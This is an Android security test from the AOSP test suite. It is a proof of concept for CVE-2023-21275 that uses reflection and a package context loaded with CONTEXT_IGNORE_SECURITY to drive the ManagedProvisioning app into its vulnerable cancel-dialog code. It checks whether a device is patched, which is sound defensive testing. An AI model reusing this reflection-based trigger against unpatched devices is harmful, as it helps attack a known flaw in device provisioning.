/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts;

import static android.content.Context.CONTEXT_IGNORE_SECURITY;
import static android.content.Context.CONTEXT_INCLUDE_CODE;

import static androidx.test.core.app.ApplicationProvider.getApplicationContext;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Fragment;
import android.app.FragmentController;
import android.app.FragmentHostCallback;
import android.app.FragmentManager;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.platform.test.annotations.AsbSecurityTest;

import androidx.test.runner.AndroidJUnit4;

import com.android.sts.common.util.StsExtraBusinessLogicTestCase;

import org.junit.Test;
import org.junit.runner.RunWith;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.concurrent.CompletableFuture;

@RunWith(AndroidJUnit4.class)
public class CVE_2023_21275 extends StsExtraBusinessLogicTestCase {

    @SuppressLint("MissingFail")
    @AsbSecurityTest(cveBugId = 278691965)
    @Test
    public void testPocCVE_2023_21275() {
        try {
            // Create context for 'com.android.managedprovisioning' package.
            final Context applicationContext = getApplicationContext();
            final String managedProvisioningPkgName =
                    getPackageName(
                            applicationContext,
                            DevicePolicyManager.ACTION_PROVISION_MANAGED_PROFILE);
            final Context managedProvisioningContext =
                    applicationContext.createPackageContext(
                            managedProvisioningPkgName,
                            CONTEXT_IGNORE_SECURITY | CONTEXT_INCLUDE_CODE);

            // Required to create an instance of 'AdminIntegratedFlowPrepareActivity'
            Looper.prepare();

            // Load 'AdminIntegratedFlowPrepareActivity' class using package context
            // and create an instance of it.
            final ClassLoader managedProvisioningClassLoader =
                    managedProvisioningContext.getClassLoader();
            final Class adminIntegratedFlowPrepareActivityClass =
                    managedProvisioningClassLoader.loadClass(
                            managedProvisioningPkgName.concat(
                                    ".provisioning.AdminIntegratedFlowPrepareActivity"));
            final Constructor adminIntegratedFlowPrepareActivityConstructor =
                    adminIntegratedFlowPrepareActivityClass.getDeclaredConstructor();
            assume().withMessage(
                            "Failed to get the constructor of 'AdminIntegratedFlowPrepareActivity'")
                    .that(adminIntegratedFlowPrepareActivityConstructor)
                    .isNotNull();
            final CompletableFuture<Object> createInstanceInMainThread =
                    new CompletableFuture<Object>();
            new Handler(Looper.getMainLooper()) // Instance must be created in main-thread
                    .post(
                            () -> {
                                try {
                                    createInstanceInMainThread.complete(
                                            adminIntegratedFlowPrepareActivityConstructor
                                                    .newInstance());
                                } catch (Exception exception) {
                                    throw new IllegalStateException(exception);
                                }
                            });
            final Object adminIntegratedFlowPrepareActivityObj = createInstanceInMainThread.get();
            assume().withMessage(
                            "Failed to create an instance of 'AdminIntegratedFlowPrepareActivity'")
                    .that(adminIntegratedFlowPrepareActivityObj)
                    .isNotNull();

            // Set the application context to 'mBase' for the created instance
            // of 'AdminIntegratedFlowPrepareActivity'.
            getDeclaredField(ContextWrapper.class, "mBase")
                    .set(adminIntegratedFlowPrepareActivityObj, applicationContext);

            // Load 'ProvisioningParams$Builder' class and create an instance of it.
            final Class provisioningParamsBuilderClass =
                    managedProvisioningClassLoader.loadClass(
                            managedProvisioningPkgName.concat(".model.ProvisioningParams$Builder"));
            final Constructor provisioningParamsBuilderConstructor =
                    provisioningParamsBuilderClass.getDeclaredConstructor();
            assume().withMessage("Failed to get the constructor of 'ProvisioningParams$Builder'")
                    .that(provisioningParamsBuilderConstructor)
                    .isNotNull();
            Object builderObj = provisioningParamsBuilderConstructor.newInstance();

            // Invoke 'setDeviceAdminPackageName()' to set 'mDeviceAdminPackageName'
            // and 'setProvisioningAction()' to set 'mProvisioningAction' in the created
            // instance of 'ProvisioningParams$Builder'.
            // Further, invoke 'build()' to create an instance of 'ProvisioningParams'.
            builderObj =
                    getDeclaredMethod(
                                    provisioningParamsBuilderClass,
                                    "setDeviceAdminPackageName",
                                    String.class)
                            .invoke(builderObj, managedProvisioningContext.getPackageName());
            builderObj =
                    getDeclaredMethod(
                                    provisioningParamsBuilderClass,
                                    "setProvisioningAction",
                                    String.class)
                            .invoke(
                                    builderObj,
                                    "" /* It should not be 'ACTION_PROVISION_MANAGED_DEVICE' */);
            final Object provisioningParamsInstance =
                    getDeclaredMethod(provisioningParamsBuilderClass, "build").invoke(builderObj);

            // Set the created instance of 'ProvisioningParams' to the 'mParams' of the
            // 'AbstractProvisioningActivity' which is superclass of
            // 'AdminIntegratedFlowPrepareActivity'.
            final Class abstractProvisioningActivityClass =
                    managedProvisioningClassLoader.loadClass(
                            managedProvisioningPkgName.concat(
                                    ".provisioning.AbstractProvisioningActivity"));
            final Field paramsField =
                    getDeclaredField(abstractProvisioningActivityClass, "mParams");
            paramsField.set(adminIntegratedFlowPrepareActivityObj, provisioningParamsInstance);

            // Fetch the 'mHost' of the created instance of 'AdminIntegratedFlowPrepareActivity'
            // and further assign it to the created instance of 'Fragment'.
            final FragmentController fragmentController =
                    (FragmentController)
                            getDeclaredField(Activity.class, "mFragments")
                                    .get(adminIntegratedFlowPrepareActivityObj);
            final FragmentHostCallback fragmentHostCallback =
                    (FragmentHostCallback)
                            getDeclaredField(FragmentController.class, "mHost")
                                    .get(fragmentController);

            // Fetch the 'FragmentManager' for the created activity instance of
            // 'AdminIntegratedFlowPrepareActivity'.
            final FragmentManager fragmentManager =
                    (FragmentManager)
                            getDeclaredMethod(Activity.class, "getFragmentManager")
                                    .invoke(adminIntegratedFlowPrepareActivityObj);

            // Create an instance of 'Fragment' and set properties 'mHost', 'mTag', 'mAdded'.
            final Fragment fragment = new Fragment();
            final String cancelProvisioningDialogOk =
                    (String)
                            getDeclaredField(
                                            abstractProvisioningActivityClass,
                                            "CANCEL_PROVISIONING_DIALOG_OK")
                                    .get(null);
            getDeclaredField(Fragment.class, "mHost").set(fragment, fragmentHostCallback);
            getDeclaredField(Fragment.class, "mTag").set(fragment, cancelProvisioningDialogOk);
            getDeclaredField(Fragment.class, "mAdded").set(fragment, true);

            // Add the created instance of 'Fragment' class with
            // tag name 'CancelProvisioningDialogOk' into the 'mAdded'
            // list of 'FragmentManagerImpl'.
            final Class fragmentManagerImplClass =
                    applicationContext
                            .getClassLoader()
                            .loadClass("android.app.FragmentManagerImpl");
            ArrayList<Fragment> fragmentList =
                    (ArrayList<Fragment>)
                            getDeclaredField(fragmentManagerImplClass, "mAdded")
                                    .get(fragmentManager);
            fragmentList.add(fragment);

            // For android-14 and above.
            // Set 'deviceName' and 'mScreenKey' for the context to reproduce the vulnerability.
            if (VERSION.SDK_INT > 33 /* TIRAMISU */) {
                // Set 'mScreenKey' of 'AbstractProvisioningActivity'
                final Object screenKeyClassObj =
                        getDeclaredMethod(
                                        managedProvisioningClassLoader.loadClass(
                                                "com.google.android.setupcompat.logging.ScreenKey"),
                                        "of",
                                        String.class,
                                        Context.class)
                                .invoke(null, "cve_2023_21275_name", managedProvisioningContext);
                getDeclaredField(abstractProvisioningActivityClass, "mScreenKey")
                        .set(adminIntegratedFlowPrepareActivityObj, screenKeyClassObj);

                // Set 'deviceName' to reach the vulnerable code
                final Class deviceHelperClass =
                        managedProvisioningClassLoader.loadClass(
                                "com.google.android.setupdesign.util.DeviceHelper");
                final Bundle bundle = new Bundle();
                final String deviceNameKey =
                        (String)
                                getDeclaredField(deviceHelperClass, "GET_DEVICE_NAME_METHOD")
                                        .get(null);
                bundle.putCharSequence(deviceNameKey, "cve_2023_21275_device");
                getDeclaredField(deviceHelperClass, "deviceName").set(null, bundle);
            }

            // Check if
            // 'isDeviceOwnerAction(mParams.provisioningAction)' returns false.
            // 'isOrganizationOwnedAllowed(mParams))' returns false.
            // 'isDialogAdded()' returns true.
            final Class setupLayoutActivityClass =
                    managedProvisioningClassLoader.loadClass(
                            managedProvisioningPkgName.concat(".common.SetupLayoutActivity"));
            final Object utilsClassObject =
                    getDeclaredMethod(setupLayoutActivityClass, "getUtils")
                            .invoke(adminIntegratedFlowPrepareActivityObj);
            final Class utilsClass =
                    managedProvisioningClassLoader.loadClass(
                            managedProvisioningPkgName.concat(".common.Utils"));
            final Class provisioningParamsClass =
                    managedProvisioningClassLoader.loadClass(
                            managedProvisioningPkgName.concat(".model.ProvisioningParams"));
            final String provisioningAction =
                    (String)
                            getDeclaredField(provisioningParamsClass, "provisioningAction")
                                    .get(paramsField.get(adminIntegratedFlowPrepareActivityObj));
            final boolean isDeviceOwnerAction =
                    (boolean)
                            getDeclaredMethod(utilsClass, "isDeviceOwnerAction", String.class)
                                    .invoke(utilsClassObject, provisioningAction);
            final boolean isOrganizationOwnedAllowed =
                    (boolean)
                            getDeclaredMethod(
                                            utilsClass,
                                            "isOrganizationOwnedAllowed",
                                            provisioningParamsClass)
                                    .invoke(utilsClassObject, provisioningParamsInstance);
            final boolean isDialogAdded =
                    (boolean)
                            getDeclaredMethod(
                                            setupLayoutActivityClass, "isDialogAdded", String.class)
                                    .invoke(
                                            adminIntegratedFlowPrepareActivityObj,
                                            cancelProvisioningDialogOk);
            assume().withMessage(
                            "Configurations were not set properly.\nisDeviceOwnerAction="
                                    + isDeviceOwnerAction
                                    + "\nisOrganizationOwnedAllowed="
                                    + isOrganizationOwnedAllowed
                                    + "\nisDialogAdded="
                                    + isDialogAdded)
                    .that(!isDeviceOwnerAction && !isOrganizationOwnedAllowed && isDialogAdded)
                    .isTrue();

            // Invoke the vulnerable method.
            final Method vulnerableMethod =
                    getDeclaredMethod(
                            adminIntegratedFlowPrepareActivityClass,
                            "decideCancelProvisioningDialog");
            try {
                vulnerableMethod.invoke(adminIntegratedFlowPrepareActivityObj);
            } catch (InvocationTargetException exception) {
                final Throwable cause = exception.getCause();
                assume().withMessage("Unexpected cause for the 'InvocationTargetException'")
                        .that(cause)
                        .isInstanceOf(IllegalStateException.class);
                assertWithMessage("Device is vulnerable to b/278691965!!")
                        .that(cause)
                        .hasMessageThat()
                        .doesNotContain("Activity has been destroyed");
            }
        } catch (Exception e) {
            assume().that(e).isNull();
        }
    }

    public final Field getDeclaredField(Class cls, String filedName) {
        for (Field declaredField : cls.getDeclaredFields()) {
            if (declaredField.getName().contains(filedName)) {
                declaredField.setAccessible(true);
                return declaredField;
            }
        }
        throw new IllegalStateException(
                String.format("No field found with name: %s in %s", filedName, cls));
    }

    public final Method getDeclaredMethod(Class cls, String methodName, Class... args)
            throws NoSuchMethodException {
        final Method targetMethod = cls.getDeclaredMethod(methodName, args);
        targetMethod.setAccessible(true);
        return targetMethod;
    }

    public final String getPackageName(Context context, String action) {
        return context.getPackageManager()
                .resolveActivity(new Intent(action), 0 /* flags */)
                .getComponentInfo()
                .getComponentName()
                .getPackageName();
    }
}
